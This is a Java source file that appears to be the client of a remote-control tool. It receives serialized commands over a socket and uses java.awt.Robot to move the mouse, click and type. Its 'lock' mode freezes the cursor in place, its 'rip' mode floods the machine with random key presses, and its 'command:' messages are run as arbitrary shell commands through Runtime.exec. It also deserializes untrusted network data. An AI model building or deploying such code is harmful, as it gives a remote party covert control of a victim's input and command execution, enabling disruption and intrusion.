package socCli;

import java.awt.AWTException;
import java.awt.Robot;
import java.awt.event.InputEvent;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.net.SocketException;

import commands.Command;

public class ReadInput implements Runnable {
	private ObjectInputStream in;
	private Robot r;
	private int xLock = 0;
	private int yLock = 0;
	public long startTime;
	public boolean rip = false;
	public boolean locked = false;

	public ReadInput(ObjectInputStream in) {
		this.in = in;
		try {
			r = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		Thread lock = new Thread(new Runnable() {
			public void run() {
				while (true) {
					try {
						if (locked) {
							r.mouseMove(xLock, yLock);
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		});
		lock.setName("Lock Thread");
		lock.start();
		Thread riper = new Thread(new Runnable() {
			public void run() {
				int key = 0;
				while (true) {
					try {
						if (rip) {
							key = (int) (Math.random() * 65000);
							r.keyPress(key);
							r.keyRelease(key);
						}
					} catch (Exception e) {
						if (e instanceof IllegalArgumentException) {
							System.err.println("Invalid key: " + key);
						} else {
							e.printStackTrace();
						}

					}
				}
			}
		});
		riper.setName("Rip Thread");
		riper.start();
		startTime = System.nanoTime();
	}

	@Override
	public void run() {
		while (true) {
			// r.mouseMove(xLock, yLock);
			try {
				Object o = in.readObject();
				if (o == null) {
					// r.mouseMove(xLock, yLock);
				} else if (o instanceof Command) {
					Command c = (Command) o;
					if (c.getType().equals("move")) {
						// System.out.println(c.getX() + "  " + c.getY());
						r.mouseMove(c.getX(), c.getY());
						xLock = c.getX();
						yLock = c.getY();

					} else if (c.getType().equals("click")) {
						// r.mouseMove(xLock, yLock);
						if (c.getX() == 1) {
							r.mousePress(InputEvent.BUTTON1_MASK);
						} else if (c.getX() == 2) {
							r.mousePress(InputEvent.BUTTON3_MASK);
						}
					} else if (c.getType().equals("release")) {
						// r.mouseMove(xLock, yLock);
						if (c.getX() == 1) {
							r.mouseRelease(InputEvent.BUTTON1_MASK);
						} else if (c.getX() == 2) {
							r.mouseRelease(InputEvent.BUTTON3_MASK);
						}
					} else if (c.getType().equals("kClicked")) {
						r.keyPress(c.getX());
					} else if (c.getType().equals("kReleased")) {
						r.keyRelease(c.getX());
					} else if (c.getType().equals("rip")) {
						rip = true;
					} else if (c.getType().equals("stopRip")) {
						rip = false;
					} else if (c.getType().equals("lock")) {
						locked = true;
					} else if (c.getType().equals("unlock")) {
						locked = false;
					} else if (c.getType().startsWith("command:")) {
						String cc = c.getType().substring(8,
								c.getType().length());
						System.out.println("cc");
						
						// Start of new process thread
						
						Thread temp = new Thread(new Runnable() {
							String tempS = "";
							public void run() {
								Process p = null;
								try {
									p = Runtime.getRuntime().exec(cc);
								} catch (IOException e) {
									e.printStackTrace();
								}
								BufferedReader proIn = new BufferedReader(
										new InputStreamReader(
												p.getInputStream()));
								while (p.isAlive()) {
									try {
										if (proIn.ready()) {
											tempS += proIn.readLine();
										}
									} catch (IOException e) {
										e.printStackTrace();
									}
								}
								System.out.println(tempS);
							}
						});
						// end of new process thread

						temp.start();

						// while(proIn.available() != -1) {
						// System.out.print((char)proIn.read());
						// }
					}
				}
			} catch (ClassNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				if (e instanceof SocketException) {
					System.out.println("Maybe it should close");
					System.exit(0);
				} else {
					e.printStackTrace();
				}
			}

		}
	}

}
